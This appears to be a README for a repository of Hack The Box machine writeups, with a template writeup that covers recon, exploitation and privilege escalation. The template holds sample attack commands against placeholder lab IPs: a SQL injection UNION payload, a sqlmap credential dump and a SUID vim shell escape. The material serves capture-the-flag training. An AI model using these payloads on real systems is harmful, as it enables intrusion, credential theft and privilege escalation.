# 🚩 HTB Writeups Repository

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![GitHub Stars](https://img.shields.io/github/stars/yourusername/htb-writeups)](https://github.com/yourusername/htb-writeups/stargazers)
[![Open Issues](https://img.shields.io/github/issues/yourusername/htb-writeups)](https://github.com/yourusername/htb-writeups/issues)

A curated collection of Hack The Box machine writeups with detailed technical analysis and reproducible methodologies.

🔗 **Live Preview**: [yourwebsite.com/htb-writeups](https://yourwebsite.com) (optional)

## 📌 Features
- **Structured Documentation**: Consistent format for easy navigation
- **Technical Depth**: Vulnerability explanations with CWE/CVE references
- **Tool Integration**: Commands for popular tools like `nmap`, `Metasploit`, and `gobuster`
- **Visual Guides**: Screenshots and network diagrams
- **Searchable Tags**: Filter by OS, difficulty, and attack vectors

## 🖥️ Writeup Structure
Each machine writeup includes:
```markdown
# Machine Name (Difficulty: ⭐️ Easy)
- **IP**: 10.10.10.xx
- **OS**: Linux/Windows
- **Date Solved**: YYYY-MM-DD

## 📋 Table of Contents
1. [Recon](#-recon)
2. [Exploitation](#-exploitation)
3. [Privilege Escalation](#-privilege-escalation)
4. [Key Takeaways](#-key-takeaways)

## 🔍 Recon
```bash
nmap -sV -sC -oA nmap/initial 10.10.10.xx
```
**Findings**:
- Port 80: Apache 2.4.29 (Ubuntu)
- Port 22: OpenSSH 7.6p1

## 💻 Exploitation
### Vulnerability: SQL Injection (CWE-89)
**Steps**:
1. Identified vulnerable parameter `id` in `/products.php`
2. Crafted UNION-based payload:
```sql
' UNION SELECT 1,@@version,3-- -
```
3. Extracted credentials via SQLMap:
```bash
sqlmap -u "http://10.10.10.xx/products.php?id=1" --dump
```

## 🚀 Privilege Escalation
**Technique**: SUID Binary Abuse (GTFOBins)
```bash
find / -perm -4000 2>/dev/null
/usr/bin/vim.basic --command=':!/bin/sh'
```

## 🎯 Key Takeaways
- Always sanitize user input in web applications
- Monitor for unnecessary SUID binaries
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)

---

## COvered² Machines
![Catch](https://github.com/user-attachments/assets/16475ce5-7446-40f9-bb06-4ae1ff9d9a40)

![Code](https://github.com/user-attachments/assets/479c514e-0f01-462b-820f-14d881d4aece)

![Lame](https://github.com/user-attachments/assets/49530a10-3ed0-4b35-bb46-c325f83a912f)


![TheFrizz](https://github.com/user-attachments/assets/b66734d7-ddac-4458-83a7-ff52634429ec)

![WhiteRabbit](https://github.com/user-attachments/assets/cd8c0154-e35c-45c1-87c1-c4e7f82f0500)
